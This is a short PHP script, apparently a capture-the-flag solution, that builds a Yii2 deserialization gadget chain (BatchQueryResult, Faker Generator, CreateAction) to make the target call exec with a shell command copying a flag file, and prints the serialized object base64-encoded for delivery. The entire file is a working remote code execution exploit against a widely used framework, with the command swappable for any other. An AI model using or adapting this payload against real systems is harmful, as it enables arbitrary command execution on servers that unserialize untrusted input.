<?php

namespace yii\rest {

    class CreateAction
    {

        public $checkAccess;
        public $id;

        public function __construct()
        {

            $this->checkAccess = 'exec';
            $this->id = 'cp /fla* 1.txt';
        }
    }
}

namespace Faker {

    use yii\rest\CreateAction;

    class Generator
    {

        protected $formatters;

        public function __construct()
        {

            $this->formatters['close'] = [new CreateAction(), 'run'];
        }
    }
}

namespace yii\db {

    use Faker\Generator;

    class BatchQueryResult
    {

        private $_dataReader;

        public function __construct()
        {

            $this->_dataReader = new Generator;
        }
    }
}

namespace {

    echo base64_encode(serialize(new yii\db\BatchQueryResult));
}
?>